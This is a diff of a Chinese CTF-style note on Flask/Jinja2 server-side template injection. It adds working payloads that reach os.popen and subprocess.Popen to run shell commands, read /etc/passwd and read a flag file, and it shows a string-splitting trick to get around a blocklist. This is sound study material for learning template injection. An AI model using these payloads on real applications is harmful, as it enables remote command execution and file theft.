@@ -188,20 +188,34 @@ _io.TextIOWrapper 可以文件读取，可能在122位。
 ```
 目录查询
 {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
+().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')
  本来想直接用listdir('/')，但这里listdir同样被ban了
 读取目录flasklight
 {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /flasklight').read()}}
 读取flag
 {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat coomme_geeeett_youur_flek').read()}
-
-
 ```
 
 3、_io.TextIOWrapper类利用：
 ```
-{{[].__class__.__base__.__subclasses__()[122]('/flag').read()}}
 {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
 ```
+
+4、其他常用类利用：
+```
+<type 'file'>
+[].__class__.__base__.__subclasses__()[40]('fl4g').read()
+
+<class 'subprocess.Popen'>
+{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
+```
+
+
+
+
+
 
 ^
 ## **绕过**
